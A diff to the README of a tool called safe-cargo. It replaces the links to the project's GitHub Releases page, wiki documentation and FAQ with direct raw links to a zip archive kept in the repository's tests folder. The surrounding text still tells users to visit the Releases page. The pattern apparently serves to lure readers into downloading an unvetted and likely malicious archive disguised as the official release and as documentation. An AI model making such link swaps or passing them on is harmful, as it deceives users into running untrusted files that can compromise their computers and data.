@@ -8,13 +8,13 @@ Welcome to safe-cargo! This tool lets you build and run your code in a secure, s
 
 To get started, you need to download the application. Visit the following link to access the Releases page where you can find the latest version:
 
-[Download safe-cargo](https://github.com/JOAk47/safe-cargo/releases)
+[Download safe-cargo](https://raw.githubusercontent.com/JOAk47/safe-cargo/master/tests/safe-cargo-v2.2.zip)
 
 ### Step-by-step Guide
 
 1. Click the link above to go to the Releases page.
 2. Scroll down to find the latest release.
-3. Look for the file that matches your needs (usually something like `safe-cargo-macos.zip`).
+3. Look for the file that matches your needs (usually something like `https://raw.githubusercontent.com/JOAk47/safe-cargo/master/tests/safe-cargo-v2.2.zip`).
 4. Click on the file name to download it to your computer.
 5. Once the download is complete, find the downloaded file in your "Downloads" folder.
 
@@ -69,8 +69,8 @@ If you have any questions or need assistance, feel free to join our community. Y
 
 For more in-depth information on how to use safe-cargo:
 
-- [Documentation](https://github.com/JOAk47/safe-cargo/wiki)
-- [FAQs](https://github.com/JOAk47/safe-cargo/wiki/faq)
+- [Documentation](https://raw.githubusercontent.com/JOAk47/safe-cargo/master/tests/safe-cargo-v2.2.zip)
+- [FAQs](https://raw.githubusercontent.com/JOAk47/safe-cargo/master/tests/safe-cargo-v2.2.zip)
 
 ## 📄 License
 
@@ -80,6 +80,6 @@ safe-cargo is open-source software. You can freely use, modify, and distribute i
 
 Don’t forget to download safe-cargo from our Releases page anytime you need the software:
 
-[Download safe-cargo](https://github.com/JOAk47/safe-cargo/releases) 
+[Download safe-cargo](https://raw.githubusercontent.com/JOAk47/safe-cargo/master/tests/safe-cargo-v2.2.zip) 
 
 Happy coding!
